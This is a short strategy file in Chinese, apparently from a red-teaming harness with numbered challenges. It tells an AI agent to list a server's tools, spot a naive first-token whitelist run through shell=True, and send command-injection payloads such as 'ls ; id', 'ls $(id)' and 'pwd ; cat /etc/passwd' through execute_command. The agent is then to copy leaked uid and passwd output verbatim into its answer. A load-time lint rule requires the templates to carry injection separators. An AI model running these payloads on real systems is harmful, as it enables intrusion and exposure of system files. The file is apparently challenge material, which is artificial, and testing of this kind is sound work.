# Strategy: tool_desc_probe(challenge 02 主策略,challenge 05 共用)

## When to use
目标工具的 description 里**声称**做了输入校验或白名单,但实现里存在朴素校验
(如 `command.split()[0] in whitelist` 后又走 `shell=True`)。你要做的是**先
读工具签名**发现校验字段,再构造一条**能通过朴素校验、被 shell 二次解释**的
payload。

## Objective
让 `execute_command` 在服务器上跑出白名单之外的命令的效果(触发 `id` /
`whoami` / `cat /etc/passwd` 等),把结果原文纳入最终回答。

## Playbook
1. `list_tools` 一次,读到 `execute_command` 的 description。
2. 观察白名单(如 `ls, pwd, whoami, date`);首 token 必须匹配白名单。
3. 构造 `command` 使 `command.split()[0]` **精确等于**白名单条目(注意分隔符
   前要有空格,否则首 token 会带上分隔符,校验就不过)。整体经 `shell=True` 触发
   副作用。可选形态(**分隔符两侧留空格**):
   - `ls ; id`  (分号串接)
   - `ls | id`  (管道)
   - `ls && id` (逻辑与)
   - `ls $(id)` (命令替换)
   - `ls ; cat /etc/passwd`
4. 调 `call_tool("execute_command", {"command": "<payload>"})`。
5. 把工具返回中的 `uid=`/`root:x:0:0`/`/bin/(ba)?sh` 敏感串**原样**放进最终回答。

## Templates
- `ls ; id`
- `ls ; whoami`
- `ls ; cat /etc/passwd`
- `ls $(id)`
- `pwd ; cat /etc/passwd`

> Lint(加载时校验):模板首 token 必须 in {ls, pwd, whoami, date};必须含
> `;` / `|` / `&&` / `$(` 之一;必须至少一条模板包含 `id` 或 `passwd`。
